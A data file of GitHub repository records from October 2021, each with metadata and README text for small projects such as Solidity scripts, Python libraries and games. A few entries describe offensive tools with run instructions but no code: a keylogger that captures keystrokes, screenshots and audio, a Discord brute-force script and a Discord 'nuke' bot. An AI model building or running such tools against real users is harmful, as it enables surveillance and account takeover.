417521808;aave_brownie;https://github.com/alv-carpe-diem/aave_brownie;Solidity;2021-10-15T14:06:21Z;0;0;0; Swap our ETH for WETH Deposit some ETH (WETH) into Aave Borrow some asset with the ETH collateral  Sell that borrowed asset. (Short sell)   Repay everything back  Testing: Integration test: Kovan Unit tests: Mainnet-fork (Since we are not using oracles hence no need of mocks) 
417510660;easy-algo;https://github.com/fr1gid/easy-algo;Python;2021-10-15T13:31:59Z;0;0;0;
417471665;ezmc;https://github.com/jpmvferreira/ezmc;Python;2021-10-15T11:15:33Z;0;0;0;Abstract A Python command line interface (CLI) that wraps around Stan, using PyStan, to implement Hamiltonian Monte Carlo (HMC) on different models, with different datasets. 
417513915;Programming-Paradigm;https://github.com/n-cekic/Programming-Paradigm;Go;2021-10-15T13:42:41Z;0;0;0;Programming-Paradigm After running python3 1_22.py you'll get a prompt:  which, after entering start and the end of the interval, should create next window:  After running python3 1_23.py you'll get a prompt:  which, after entering start and the end of the interval, should create next window:  
417451066;Instagram;https://github.com/alirahmani93/Instagram;JavaScript;2021-10-15T09:58:30Z;0;0;0;Instagram 
417555775;tsih;https://github.com/balkian/tsih;Python;2021-10-15T15:51:20Z;0;0;0;"TSIH - A dict with a HISTory tsih.Dict is a type of UserDict that allows versioning, backed up by a sqlite3 database.  Transparent operation Only changes (deltas) are stored. Forward-filling of values. A value is reused in future versions, unless it changes. Auto-versioning option (off by default), to produce a new version every time a value change happens. Ability to store related entries as separate dictionaries. Each tsih.Dict has a dict_name that is used in the database to identify the dictionary. Tuple-based indexing. Get and set values by dict_name, version and key.  Usage and examples tsih.Dict objects can be used just like regular dictionaries: >>> from tsih import Dict >>> a = Dict() >>> a['test'] = True >>> a {'test': True} >>> a.get('missing', 5) 5 >>> a['missing'] Traceback (most recent call last):   File ""<stdin>"", line 1, in <module> KeyError: 'missing' But at any point, new versions can be produced: >>> a.version 0 >>> a['start'] = 'now' >>> a {'test': True, 'start': 'now'} >>> a.version = 1 >>> a['start'] = 'one version ago' >>> a {'test': True, 'start': 'one version ago'} Previous values can be accessed using tuple keys, i.e., (version, key): >>> a[(0, 'start')] 'now' >>> a[(1, 'start')] 'one version ago' Each version only ""records"" changes, but later versions (even if they don't exist yet) inherit unchanged values from the previous ones: >>> a[(5, 'start')]   'one version ago' >>> a.version = 5 >>> # Until the value is changed >>> a['start'] = '4 versions ago'  >>> a[(5, 'start')] '4 versions ago' You can access every state of the Dict using None in place of the version and/or the key. In that case, we will get an iterator, which we can turn into a list explicitly or with the .value method. For example, here we get all the changes to the start key: >>> a[(None, 'start')].value() #  [(0.0, 'now'), (1.0, 'one version ago'), (5.0, '4 versions ago')] Similarly, to get the keys and values at a specific version: >>> list(a[(0, None)]) [('start', 'now'), ('test', True)] Or, we can combine both to get the keys and values at every version: >>> a[(None, None)].value() [(0.0, 'start', 'now'), (1.0, 'start', 'one version ago'), (5.0, 'start', '4 versions ago'), (0.0, 'test', True), (1.0, 'test', True), (5.0, 'test', True)] Use cases Tsih was originally part of the Soil Agent-Based Social Simulation framework, where both the environment and the agents need to keep track of state (i.e., attribute) changes. "
417528653;Linear-Regression;https://github.com/shruthiyal/Linear-Regression;Jupyter Notebook;2021-10-15T14:26:38Z;0;0;0;
417474686;subeen_52problemsSolve;https://github.com/thisIsShikhar/subeen_52problemsSolve;Python;2021-10-15T11:26:50Z;0;0;0;
417422654;cpp2py-zmq;https://github.com/takamatsu-shyo/cpp2py-zmq;C++;2021-10-15T08:21:22Z;0;0;0;cpp2py-zmq Take frames from a USB camera, send them via ZeroMQ to Python subscriber. 0. Setup environment  Ubuntu 20.04 Install OpenCV and cppzmq https://github.com/zeromq/cppzmq  1. Compile C++ code cmake . make  2. Prepare virtualenv for Python code Open secondaly terminal python3 -m venv venv source venv/bin/activate pip install -r requirements.txt  3. Run C++ code (Publisher) ./Cpp2PyZmq  4. Run Python code (Subscriber) At the secondaly  terminal. python sub.py  5. Reference https://stackoverflow.com/questions/55619871/how-to-i-transfer-an-imageopencv-matrix-numpy-array-from-c-publisher-to-pyth 
417457688;IPy-Retrieve;https://github.com/AndreaMarinas05/IPy-Retrieve;;2021-10-15T10:23:03Z;0;0;0;IPy-Retrieve IPy Retrieve aims to provide IP addressing information to network technicians via a Python application. 
417437760;Monet-Cycle-GAN;https://github.com/avichaigel/Monet-Cycle-GAN;Jupyter Notebook;2021-10-15T09:11:19Z;0;0;0;
417517996;Hangman;https://github.com/ofekerez/Hangman;Python;2021-10-15T13:55:24Z;0;0;0;
417514550;3dbag-workshop-foss4gnl2021;https://github.com/3DGI/3dbag-workshop-foss4gnl2021;;2021-10-15T13:44:41Z;0;0;0;Using the 3D BAG in Python In this workshop we are going to walk you through the details of the 3D BAG data set, which is a collection of 3D building models at multiple levels of detail for the Netherlands. See https://3dbag.nl. We will introduce the data set, discussing the data model, available formats, data quality and some of the peculiarities. In the hands-on part of the session, we will show how you can make the most out of the data by using Python, whether you integrate with other services or use it directly for analysis. In this part we will focus on CityJSON (http://www.cityjson.org) and cjio (https://github.com/cityjson/cjio), but we will also show other tools that can be helpful for working with the data. Installing the dependencies Python version: 3.6 or above. We used Python 3.8 for developing these materials. With conda Probably the easiest if you install the dependencies with conda. See how to install conda Create a new conda environment and set install the dependencies from the environment.yml file. conda env create --name foss4gnl_3dbag --file environment.yml Not using conda You can also set up everything if you cannot or don't want to use conda. In this case, install the dependencies manually with pip. The dependencies are listed in the environment.yml file. 
417523083;CT.gov_Eligibility_Criteria;https://github.com/goetzke2/CT.gov_Eligibility_Criteria;;2021-10-15T14:09:56Z;0;0;0;CT.gov_Eligibility_Criteria Python notebook to parse eligibility criteria from ct.gov for diabetic retinopathy and glaucoma trials 
417549098;stickerResizer;https://github.com/juanpintop/stickerResizer;Python;2021-10-15T15:29:13Z;0;0;0;stickerResizer Python Script to resize all images from a folder to sticker size-format for telegram. Notes  Tested only on Windows 11 Home Insider Preview 22471.1000  Requirements  Python 3.8+ Pillow  Usage  Execute the script on a folder with the following structure:  \root 	|resizer.py 	\input 		|image1.png 		|image2.jpg 		|... 	\output   After execution, output folder should contain telegram-ready resized png versions.  
417537664;future-map;https://github.com/hiroara/future-map;Python;2021-10-15T14:54:09Z;0;0;0;"future-map future-map is a Python library to use together with the official concurrent.futures module. Why future-map? Because it's difficult to deal with an infinite or huge input with concurrent.future.ThreadPoolExecutor and concurrent.future.ProcessPoolExecutor. See the following example. from concurrent.futures import ThreadPoolExecutor  def make_input(length):     return range(length)  def make_infinite_input():     count = 0     while True:         yield count         count += 1  def process(value):     return value * 2  if __name__ == '__main__':     with ThreadPoolExecutor(max_workers=3) as executor:         # Works well         for value in executor.map(process, make_input(10)):             print('Doubled value:', value)          # This freezes the process and memory usage keeps growing         for value in executor.map(process, make_infinite_input()):             print('Doubled value:', value) Installation Use the package manager pip to install future-map. $ pip install future-map  Usage This library provides FutureMap. See the following example. from future_map import FutureMap from concurrent.futures import ThreadPoolExecutor  def make_infinite_input():     count = 0     while True:         yield count         count += 1  def process(value):     return value * 2  if __name__ == '__main__':     with ThreadPoolExecutor(max_workers=3) as executor:         fm = FutureMap(             lambda value: executor.submit(process, value),             make_infinite_input(), buffersize=5         )         for value in fm:             print('Doubled value:', value) For more complicated use case: import time from concurrent.futures import ThreadPoolExecutor  from future_map import FutureMap  class APIClient:     def __init__(self, max_connections):         self.__max_connections = max_connections         self.__executor = None      def __enter__(self):         self.__executor = ThreadPoolExecutor(max_workers=self.__max_connections)         return self      def __exit__(self, exc_type, exc_value, traceback):         self.__executor.shutdown()         self.__executor = None      def call(self, url):         time.sleep(1)         return ""Response from {}"".format(url)      def call_async(self, url):         if self.__executor is None:             raise Exception(""call_async needs to be called in the runtime context with this APIClient"")         return self.__executor.submit(self.call, url)   def make_urls():     for i in range(100):         yield ""https://example.com/api/resources/{}"".format(i)  if __name__ == '__main__':     with APIClient(max_connections=3) as api_client:         for response in FutureMap(api_client.call_async, make_urls(), buffersize=5):             print(response) API FutureMap(fn, iterable, buffersize) Constructor of FutureMap. FutureMap is an iterable object that maps an iterable object (iterable argument) to a function (fn argument), waits until each future object is done, and yields each result. Please note that this object will yield unordered results.  Arguments  fn: Callable object that takes an argument from iterable, and return a concurrent.futures.Future. iterable: Iterable object. buffersize: Maximum size of internal buffer. Each concurrent.futures.Future object is stored in the buffer until it's done. If the buffer is fulfilled, FutureMap stops reading values from iterable.   Return  FutureMap instance    future_map(fn, iterable, buffersize) Alias of FutureMap. You can use this function if you prefer a similar syntax with the map function. For more details, please refer to FutureMap(fn, iterable, buffersize). Contributing Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change. Please make sure to update tests as appropriate. License MIT "
417533290;ComputerVisionSmallProject;https://github.com/quangcrazymen/ComputerVisionSmallProject;Python;2021-10-15T14:40:40Z;0;0;0;ComputerVisionSmallProject Exercise and simple computer vision, digital image processing projects using OpenCV, python scientific lib... 
417447913;misc-projects;https://github.com/XanderMax/misc-projects;C++;2021-10-15T09:47:18Z;0;0;0;
417423008;ctoh;https://github.com/kostoskistefan/ctoh;Python;2021-10-15T08:22:43Z;0;0;0;CToH  CToH is a very simple Python script that takes a C/C++ source file and generates a corresponding header file. Quick note This script only generates the functions from the source file. You'll still need to fix import errors and possible global variables that you might want to use. Requirements  Any version of Python3  Installation Clone the repository using git clone https://github.com/kostoskistefan/ctoh.git Change to the cloned directory cd ctoh Run the script python ctoh.py [OPTIONS] Usage options usage: ctoh.py [-h] -i INPUT [-s] [-o OUTPUT]  Create header file from a source file  required arguments:   -i INPUT, --input INPUT                         Path to the source file  optional arguments:   -h, --help            show this help message and exit   -s, --sort            Sort the functions in the header file by length   -o OUTPUT, --output OUTPUT                         Specify the full output path and filename for the generated header file  Example usage Parse the source file /home/user/source.c and generate the header file in /home/user/another_directory/ with the name new_name.h. python ctoh.py -i /home/user/source.c -o /home/user/another_directory/new_name.h 
417545969;Linear-Regression-on-Ford_Stock_Data;https://github.com/VinothKumar-Vu/Linear-Regression-on-Ford_Stock_Data;Jupyter Notebook;2021-10-15T15:19:26Z;0;0;0;
417465465;eXchangeAWS;https://github.com/dscholefield/eXchangeAWS;;2021-10-15T10:53:23Z;0;0;0;
417476045;puzzle;https://github.com/Jayden-Chen-X/puzzle;;2021-10-15T11:32:04Z;0;0;0;puzzle This is a python project created and edited by Jayden Chen. All Rights reserved. 
417494786;Qfileserv;https://github.com/bearx/Qfileserv;Python;2021-10-15T12:39:48Z;0;0;0;Qfileserv   A super-simple and super-easy use server, use Flask and python usage: python serve.py   The program will easily translate current dir into a website.   Default port 8080 
417459486;pyOCAnalyze;https://github.com/Yamyee/pyOCAnalyze;Python;2021-10-15T10:29:43Z;0;0;0;
417445492;ftp_textLog_sync;https://github.com/Liuhaixv/ftp_textLog_sync;Python;2021-10-15T09:38:23Z;1;1;0;FTP远程log同步工具 使用Notepad++配合来获取实时更新的log文档效果 适用于FTP协议的log远程同步工具,配合MT管理器开启FTP服务器使用,通过Notepad++监听文本变化,更便捷的使用电脑查看方法注入打印后的信息 功能  过滤器 对每行要打印的文本使用回调函数筛选，支持链式调用 最终修改器 对最终要打印的字符串使用回调函数替换   Log sync tool (FTP) Use Notepad++ for real-time sync after python appending new log text Tool for log's remote syncing. Features  Filters filter lines by callable functions(function list) Output string replace addon-on replace the output string with a callable function  
417491546;Pong-Game;https://github.com/SAPX14/Pong-Game;Python;2021-10-15T12:28:12Z;0;0;0;Pong-Game This is my code for Pong game built using python by a guided YouTube project. Game Over code has been solely written by me :) 
417423006;PLOTTING-3D-GRAPHS-AND-LINES;https://github.com/ishita0271/PLOTTING-3D-GRAPHS-AND-LINES;Python;2021-10-15T08:22:42Z;0;0;0;PLOTTING-3D-GRAPHS-AND-LINES I have tried to use Python Libraries to plot 3D Graphs and Lines 
417557885;Coding-Challenges;https://github.com/daviddbates/Coding-Challenges;;2021-10-15T15:58:18Z;0;0;0;
417493489;Dragons-vs-Terminators;https://github.com/pukxukxex/Dragons-vs-Terminators;Python;2021-10-15T12:35:13Z;0;0;0;Dragons-vs-Terminators A web based tower-defense game built using python and its ooc functionality 
417423285;keylogger;https://github.com/arkhamHack/keylogger;Python;2021-10-15T08:23:36Z;0;0;0;keylogger A python keylogger to record screenshots, key strokes, machine information and audio recordings 
417528731;NeuralBug;https://github.com/WilsonBateman/NeuralBug;Python;2021-10-15T14:26:55Z;0;0;0;NeuralBug I've begun designing an extensible neural net before, hoping to probe the space by following more of an evolutionary framework. That being the case, I started out using the analog of a planarian worm using its eye dots (which can only sense light and dark) to find food. Because of this framework, I'm still trying to figure out how to handle the issue of reward. Backpropogation is a strong technical solution, but I need more research to figure out how real brains reinforce the connections between neurons. My goal right now, as naive as it is, is to develop a system in which I can add input and output models over time to try and mimic the growth of brains 
417457337;Laguerre;https://github.com/icyfig/Laguerre;Python;2021-10-15T10:21:50Z;0;0;0;Laguerre Python program that implements the Laguerre method for algorithmically finding the root of a polynomial without numpy, scipy, or any other external packages 
417510117;Projeto-Django;https://github.com/MariaEduarda-jo/Projeto-Django;;2021-10-15T13:30:23Z;0;0;0;
417545014;assignment4;https://github.com/SEUZFY/assignment4;C++;2021-10-15T15:16:28Z;0;0;0;assignment4 Assignment 4 for GEO1000 Python Programming for Geomatics course at Delft University of Technology, Q1, 2021. 
417477714;Xempt-Cryptor;https://github.com/AnonymousXempt/Xempt-Cryptor;Python;2021-10-15T11:38:29Z;1;1;0;"Xempt-Cryptor    A Program To Encrypt And Decrypt Files In Current Directory Using The Python Cryptography Package!    Contents  Usage  For Encrypting For Decrypting   Installation  Download CMD Releases   Video Licence  Usage For Encrypting  Place The Encryptor In The Same Directory As The File You Want To Encrypt. Open CMD In The Directory Type py ""Xempt Encryptor.py"" Hit Enter Every File In Directory Will Be Encrypted (except .py, .exe, and .key filetypes) Make Sure To Safely Store The Key  For Decrypting  Place The Decryptor In The Same Directory As Encrypted Files Include The Key Generated To Encrypt The Files Open CMD In The Directory Type py ""Xempt Decryptor.py"" Hit Enter Every File Will Be Decrypted Providing The Correct Key Was Used  Installation Below Are The Instructions For Installing On Windows  Cryptography Can Be Installed By Running pip install cryptography  Note: Python needs to be installed on the system Download  Xempt-Cryptor-Main.zip  OR CMD git clone https://github.com/AnonymousXempt/Xempt-Cryptor  Releases This Option Is For Non Python Users Download Compiled Executables From The Wiki Video Click The Image Below To be Redirected To YouTube  Licence MIT License Copyright (c) 2021 Anonymous Xempt Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. "
417473366;tikatok;https://github.com/gitdevstar/tikatok;JavaScript;2021-10-15T11:21:54Z;0;0;0;tikatok It is a project to customize image on canvas  
417463751;folder_sync;https://github.com/gedaddams/folder_sync;Python;2021-10-15T10:46:31Z;0;0;0;
417553083;subsea-pipeline;https://github.com/CollinsJesurobo/subsea-pipeline;Python;2021-10-15T15:42:36Z;0;0;0;"             Parametric study of the influence of wall thickness on pipeline expansion design.  Tools used:  Abaqus Python xlsxwriter  Description: Pipeline resting on seabed and subjected to pressure and temperature will expand. The forces causing the expansion are the resultant effect of  endcap force, poisson force, thermal force and frictional resistance. This tool has been prepared to verify the behaviour of pipeline expansion due to effect of  wall thickness variation. A basecase abaqus input file of the pipeline expansion was first prepared . The wall thickness in the input file was parameterized in such a way as to allow variation of the thickness value . Six thickness values has been evaluated in this study using the python parametric study method for Abaqus to generate 6 input files and automatically batch runs to obtain 6odbs which is called LOADCASES in this analysis. The thickness values are :[15.9mm,19.1mm,22.3mm,25.1mm,27.1mm, 30.2mm]. The parametric study script  used here is called ""study.psf"". Upon successful completion of the preprocessing, the 6odbs are generated in the project folder. Each odbs contains 6 steps and 1000 pipeline nodes. Thus, the total loadcase data  is 6 x 6 x 1000 = 36000 loadcases. The postprocessing is done in the Python scripts called ""Python postprocessor"". The script open the odbs one after the other ,  loop through each loading steps and extract the results for nodal displacements U1,U2 and U3, then write the result to excel sheet2 with help of xlsxwriter. open sheet1 and write the maximum, minimum values of U1, U2 and U3 and the corrsponding node, loadstep were it occurs. Thus with a table of values of worst thermal expansion (U1) for each loadcase and their corresponding thickness values, a plot is made as shown in the attached excel. From the plot, one can see that as the wall thickness increases, the expansion also increases which depicts a  linear relationship. 1.Preprocessing  prepare a working basecase abaqus model of the pipeline parametrize the variable for study in the input file prepare parametric study file (.psf) that contains the values to be varied run the the.psf file until successful completion   Postprocessing   prepare the python script for postprocessibg open all the odbs, loop through each of them loop through the steps in the odb extract results for U1,U2,U3,etc determine the worst expansion from U1 and associated worstloadcase create excel workbook and worksheets using xlsxwriter library write results to the sheets make a plot of expansion versus wall thickness parametric study completed  "
417455213;qispy;https://github.com/cyberme0w/qispy;Python;2021-10-15T10:13:34Z;0;0;0;Qispy - an quick and easy-to-use interface for the qis/compass grading servers 
417426698;face_mesh_detector;https://github.com/SajawalHassan/face_mesh_detector;Python;2021-10-15T08:35:00Z;0;0;0;      Face Mesh Detector      A face detector that draws points and lines on the detected face.          ·     Report Bug     ·     Request Feature    Table of Contents   About The Project  Built With    Getting Started  Prerequisites Installation   Usage Contributing   About The Project This is an python, mediapip and open-cv which are some of the best programing/packeges for computer vision. This is the kind of technology snapchat, instagram and your phones default camera app uses to focus or put filters on your face. This is an open-source project so you can add amazing features to the project more details on that here (back to top) Built With The following lists all programming/packeges used in this project and their documentation  python mediapipe open-cv  (back to top) Getting Started To get a local copy up and running follow these simple example steps. Prerequisites Here are some of the things you need to use the software and how to install them.  python mediapipe open-cv  Installation   python   mediapipe   pip install mediapipe  open-cv  pip install opencv-python (back to top) Usage This project can be used to detect the faces of humans which can really be useful in today's world where everything is ML (machine learning) and AI (Artificial Intelligence). For more examples, please refer to the Documentation (back to top) Contributing Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated. If you have a suggestion that would make this better, please fork the repo and create a pull request Don't forget to give the project a star! Thanks again!  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  (back to top) 
417533502;Calculator;https://github.com/HamzaAbbas0/Calculator;Python;2021-10-15T14:41:21Z;0;0;0;
417504506;pl4py;https://github.com/Dark-Athena/pl4py;PLSQL;2021-10-15T13:12:17Z;0;0;0;"pl4py 项目地址 https://github.com/Dark-Athena/pl4py 使用本程序，你可以在oracle数据库中使用自定义python函数 （不是21c版本中的OML4PY 【ORACLE】在ORACLE数据库中启用机器学习功能（OML）以支持PYTHON脚本的运行 ） 这是开发中的版本，请勿用于生产环境 请确保oracle数据库版本至少为10g 数据库操作系统上需要安装python 为了避免一些不可控的情况，需要在程序中提前手工指定python主程序的全路径 目前只在windows环境中测试通过 原理： 使用schedule_job启动python的flask服务 通过utl_file包将用户自定义函数生成py文件保存到操作系统 使用utl_http包发送请求到flask，传入函数名称及参数数据 flask动态从文件加载python函数，并将参数数据传入函数，获得返回值 此时，plsql中可获得python函数返回的结果 安装步骤 第一步 在数据库操作系统上安装python程序，并安装flask包，建议py3，py2没有测试 pip install flask 第二步 在数据库所在的操作系统上建立一个文件夹，此文件夹会保存你在数据库中创建的包含python函数的文件 例如： mkdir F:\oracle\PY_FILE 第三步 在数据库中创建一个目录 ，名称为 “PY_FILE” ，指向操作系统中，上一步你创建的文件夹 create or replace directory PY_FILE as 'F:\oracle\PY_FILE' 第四步 使用数据库sys账号对你想要安装本程序的用户进行授权， grant select on dba_directories to {username} with grant option; 第五步 登录你要安装本程序的数据库账号，依次执行以下脚本  PL4PY_FUNC_LIST.sql PL4PY_FUNC_LIST_TRI.trg PL4PY.pck pl4py_func_list_v.sql  使用举例 一、启动服务 begin   PL4PY.start_service; end; 二、创建（或更新）函数 BEGIN   PL4PY.create_func(i_func_name => 'sample_f.py',                     i_contents  => q'{def sample_f(num):     return float(num)*float(num) }'); END; 三、使用函数 select  pl4py.call_func_Eval('sample_f.py', '8') r from dual;  64 四、删除函数 BEGIN   PL4PY.drop_func(i_func_name => 'sample_f.py'); END; 五、停止服务 begin   PL4PY.stop_service; end; 更复杂的函数例子  基于原始数据计算一个时间和速度相关性的模型，然后输入时间，返回速度  BEGIN   PL4PY.create_func(i_func_name => 'forecast_speed.py',                     i_contents  => q'{import numpy from sklearn.metrics import r2_score import matplotlib.pyplot as plt def forecast_speed(hour):     x = [1,2,3,5,6,7,8,9,10,12,13,14,15,16,18,19,21,22]     y = [100,90,80,60,60,55,60,65,70,70,75,76,78,79,90,99,99,100]     mymodel = numpy.poly1d(numpy.polyfit(x, y, 3))     myline = numpy.linspace(1, 23, 100)     speed = mymodel(float(hour))     return {'speed':speed} }'); END;  select pl4py.call_func_Eval(i_func_name =>'forecast_speed.py', i_data=>'11') r from dual  {""speed"": 65.03276500414789}  传入一个sql，获得sql中的所有表或视图名称 将 https://github.com/Dark-Athena/list_table_sql-py 中的所有文件下载到安装步骤第二步中的文件夹，比如 “F:\oracle\PY_FILE” 然后在数据库中以实际文件的方式创建函数  BEGIN   PL4PY.create_func(i_func_name => 'list_table_sql.py',                     i_dir  => 'PY_FILE',                     i_file_name  =>'list_table_sql.py'); END;    declare   r varchar2(4000);   i_data varchar2(4000); begin   i_data:='{""sql"":""select abc from def,ghi j,k.lmn o"",""mode"":""T""}';   r := pl4py.call_func_Eval(i_func_name =>'list_table_sql.py', i_data=>i_data);   dbms_output.put_line(r); end;  {""tablename"": [""def"", ""ghi"", ""k.lmn""]} 注意事项:  服务被设计成长期运行的schedule_job，函数动态切换，因此除非要完全停止或者检查问题，一般不需要执行 PL4PY.stop_service i_func_name参数必须带后缀 "".py""  "
417504667;dash;https://github.com/anshajk/dash;Python;2021-10-15T13:12:49Z;0;0;0;"Dash Container image for quickly setting up dash applications. Build docker build --pull --rm -f ""Dockerfile"" -t dash:latest ""."" Run docker run -p 8050:8050 dash:latest Dash App Examples    Dash App Description      Here’s a simple example of a Dash App that ties a Dropdown to a D3.js Plotly Graph. As the user selects a value in the Dropdown, the application code dynamically exports data from Google Finance into a Pandas DataFrame. This app was written in just 43 lines of code (view the source).    Dash app code is declarative and reactive, which makes it easy to build complex apps that contain many interactive elements. Here’s an example with 5 inputs, 3 outputs, and cross filtering. This app was composed in just 160 lines of code, all of which were Python.    Dash uses Plotly.js for charting. Over 35 chart types are supported, including maps.    Dash isn't just for dashboards. You have full control over the look and feel of your applications. Here's a Dash App that's styled to look like a PDF report.    "
417509018;hiring-service;https://github.com/rishabhrao12/hiring-service;Python;2021-10-15T13:26:41Z;0;0;0;hiring-service This is the repository for python gui project to hire people which is connected with a sql database. 
417461205;TLE;https://github.com/Brlimaye/TLE;Python;2021-10-15T10:36:18Z;0;0;0;TLE A Python Scripting Project to reduce the complexity of understanding the TLE (Two Line Element) of any Satellite Station in Orbit. A two-line element set (TLE) is a data format encoding a list of orbital elements of an Earth-orbiting object for a given point in time, the epoch. Using a suitable prediction formula, the state (position and velocity) at any point in the past or future can be estimated to some accuracy. For Example, This is the TLE for the ISS(International Space Station) ZARYA -> 1 25544U 98067A   08264.51782528 -.00002182  00000-0 -11606-4 0  2927  2 25544  51.6416 247.4627 0006703 130.5360 325.0288 15.72125391563537 This TLE is split according to the given table   The Nomenclature used for Decoding the TLE is as follows -  For Line 1 -> TLE Line1 table.pdf  For Line 2 -> TLE Line2 table.pdf  The Python Script makes the task easier for the SatCom Enthusiasts to know the Epochs and Locations and also help the On-Site concerned People. NOTE - The script does not always require PC/Laptops for obtaining the results, it can also be executed using mobile apps like Dcoder, PyDroid 3 etc. 
417531915;file-hunt;https://github.com/dulanasilva90/file-hunt;Python;2021-10-15T14:36:44Z;0;0;0;file-hunt A treasure hunt where you hunt for text files in folders in your computer. Made with only 1 python file. 
417510937;Projeto_Django;https://github.com/MariaEduarda-jo/Projeto_Django;;2021-10-15T13:32:53Z;0;0;0;Projeto_Django 
417501428;YouTube-Video-Searcher;https://github.com/Aftar-Ahmad-Sami/YouTube-Video-Searcher;Python;2021-10-15T13:02:02Z;0;0;0;YouTube-Video-Searcher Shows TOP 15 YouTube Search Results and later redirects to Default Browser when clicked 
417456390;gen-invoice;https://github.com/Gaurav61199/gen-invoice;Python;2021-10-15T10:17:59Z;0;0;0;gen-invoice This is a program based on python/pandas to generate invoice data and track Purchase Order records There are three input files  containing logistic CN detail and UOM UOM description and rates Purchase order detail associated with the UOM  python script depending upon the UOM details in #1 file automatically assigns it PO and calculates the invoice amount for a particular UOM and also tracks PO and show the plot of PO status 
417481522;find_dag_paths;https://github.com/anilkumar-01/find_dag_paths;Python;2021-10-15T11:52:24Z;0;0;0;find_dag_paths A python solution to find all generated paths starting from 0 in-degree nodes in a DAG graph. 
417491150;WebApp.PY;https://github.com/annguyendl/WebApp.PY;HTML;2021-10-15T12:26:53Z;0;0;0;WebApp.PY Web Application with Flask. Source code and documents are from https://www.udemy.com/course/the-python-mega-course. 
417463299;molecfit_wrapper;https://github.com/jdenbrok/molecfit_wrapper;Python;2021-10-15T10:44:41Z;0;0;0;Python wrapper for molecfit Molecfit is a software tool developed by ESO to perform telluric absorption correction on astronomical observations: https://www.eso.org/sci/software/pipelines/skytools/molecfit 
417519646;ofxZmqModelRunner;https://github.com/meredityman/ofxZmqModelRunner;Makefile;2021-10-15T14:00:16Z;0;0;0;This addon has ofxZmq as a dependency. The origional ofxZmq can be found here, but please use my fork here. 
417500731;abrsm-grade-5-piano-theory-tester;https://github.com/Marclev78/abrsm-grade-5-piano-theory-tester;;2021-10-15T13:00:11Z;0;0;0;abrsm-grade-5-piano-theory-tester Simple cue cards application written in Python to test knowledge of terminology for ABRSM grade 5 music theory 
417515747;automatic-piano-fingering;https://github.com/TimKoornstra/automatic-piano-fingering;Python;2021-10-15T13:48:19Z;0;0;0;"Automatically Generated Piano Fingering using Q-Learning This repository contains the code for automatically generating piano fingerings using a reinforcement learning agent that uses Q-Learning. About the code This code allows the user to input a number of music sheets in the MusicXML file format, which will be trained using the epsilon-greedy Q-Learning algorithm. The output of the program will be a pandas dataframe with each of the notes from the right hand, along with their predicted optimal fingering. A few MusicXML sheets have been provided and are stored in the data/train folder. To test the program, simply follow the ""How to run"" subsection of this README. Q-Learning is not good for generalization and this algorithm works best when the sheets in the test set are part of the training set. This ensures that the reinforcement learning agent has already seen the note combinations and the Q-Values are not empty (which results in standard finger 1). Dependencies The required packages to run this code can be found in the requirements.txt file. To run this file, execute the following code block: $ pip install -r requirements.txt   Alternatively, you can install the required packages manually like this: $ pip install <package>  How to run  Clone the repository Place all MusicXML .xml files that you want the reinforcement learning agent to train on in the data/train folder. Place all the MusicXML .xml files that you want the reinforcement learning agent to label in the data/test folder. Run $ python src/main.py See result  "
417454598;brownie_fund_me;https://github.com/H0ussam/brownie_fund_me;Solidity;2021-10-15T10:11:12Z;0;0;0;
417427141;Discord-brute-force-Public;https://github.com/Asjadd/Discord-brute-force-Public;Python;2021-10-15T08:36:20Z;0;0;0;Discord-brute-force Discord brute force Work put your id and will run it EDUCATIONAL PUPROSE ONLY Run python token.py IMPORTANT Asjad Support Server Before using somewhere else give credit 
417476446;delta-spark-stubs;https://github.com/zero323/delta-spark-stubs;Python;2021-10-15T11:33:43Z;0;0;0;delta-spark-stubs     Experimental type hints for delta-spark package. Developed for delta-io/delta#305. Installation pip install git+https://github.com/zero323/delta-spark-stubs.git Disclaimer Delta is a trademark of the LF Projects LLC. This project is not owned, endorsed, or sponsored by the LF Projects LLC. 
417484388;Heart_Disease_Prediction;https://github.com/TonmoyTalukder/Heart_Disease_Prediction;Jupyter Notebook;2021-10-15T12:02:49Z;0;0;0;Heart_Disease_Prediction_with_Python Author: Tonmoy Talukder CS Undergrad,  AUST, Dhaka 1208, Bangladesh Dataset Reference:  Browse The Dataset From Kaggle Browse The Dataset From UCI Website  Outcome:  1st Model Result:  Model is saying 75% Heart Disease patients are Male. About The 1st Model:  We are getting the Precision value from the model is 7.5 out of 10. What should be more near to 10. The Accuracy of the model is 63.74%. If the rate would more than 85% and the precision value is greater than 8 then we can say this model is pretty good, the model is not what.   2nd Model Result:  Model is saying 81.67 % patients has Heart Disease. About The 2nd Model:  We are getting the Precision value from the model is 7.9 out of 10. What should be more near to 10. The Accuracy of the model is 81.67%. If the accuracy rate would more than 85% and the precision value is greater than 8 then we can say this model is pretty good, but the model is not what.  
417426099;Discord-Nuker-;https://github.com/Asjadd/Discord-Nuker-;Python;2021-10-15T08:33:01Z;0;0;0;Discord Nuke Bot Created By Asjad  Python 3.6 - 3.10    Installation: Linux / Windows git clone https://github.com/  cd Discord-Nuke-Bot  python -m pip install -r requirements.txt  (run this file) start.bat    Running It's that simple to run! Just Enter the command python nuke-bot.py or python3 nuke-bot.py and the nuke bot Will be Launched  Preview  Important Asjad Support Server 
